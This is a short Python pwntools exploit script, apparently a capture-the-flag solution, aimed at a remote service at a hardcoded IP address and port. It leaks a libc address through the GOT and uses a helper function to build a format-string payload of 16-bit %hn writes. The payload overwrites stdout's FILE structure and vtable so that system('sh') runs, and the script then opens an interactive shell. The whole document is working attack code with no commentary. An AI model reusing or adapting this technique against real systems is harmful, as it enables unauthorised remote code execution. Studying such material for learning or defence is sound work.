#!/usr/bin/env python
from pwn import *
context.update(arch='i386', os='linux')
p, u = pack, unpack

conn = remote('202.120.7.210', 12321)

open_got = 0x8049FE8

conn.recvline()
conn.sendline(str(open_got))

open_addr = int(conn.recvline(), 16)

libc_base = open_addr - 0xdb7f0
stdout = libc_base + 0x1a9ac0
stdout_vtable = stdout + 148
io_file_jumps = libc_base + 0x1a8aa0
system = libc_base + 0x3e3e0

print 'libc_base =', hex(libc_base)

# each write is a 16 bit write
def make_fmt_str(writes, addr_offset=0, print_offset=0):
    fmt = ''
    if addr_offset % 4 != 0:
        pad = 4 - addr_offset % 4
        fmt += 'A' * pad
        addr_offset += pad
        print_offset += pad

    addr_idx = 7 + addr_offset / 4

    for a, _ in writes:
        fmt += p(a)
        print_offset += 4
    assert '\0' not in fmt
    assert '\n' not in fmt

    for _, v in writes:
        delta = (v - print_offset) & 0xffff
        if delta < 16:
            fmt += 'A' * delta
        else:
            fmt += '%' + str(delta) + 'u'
        fmt += '%' + str(addr_idx) + '$hn'
        addr_idx += 1
        print_offset = v
    assert '\0' not in fmt
    assert '\n' not in fmt

    return fmt

writes = []

sh = u('sh\x00\x00')
writes.append((stdout, sh & 0xffff))
writes.append((stdout+2, sh >> 16))

addr = stdout + 256
writes.append((addr, system & 0xffff))
writes.append((addr+2, system >> 16))

fake_vtable = addr - 0x1c
assert fake_vtable >> 16 == io_file_jumps >> 16
writes.append((stdout_vtable, fake_vtable & 0xffff))

payload = ''
payload = make_fmt_str(writes)

conn.sendline(payload)

conn.interactive(prompt='')
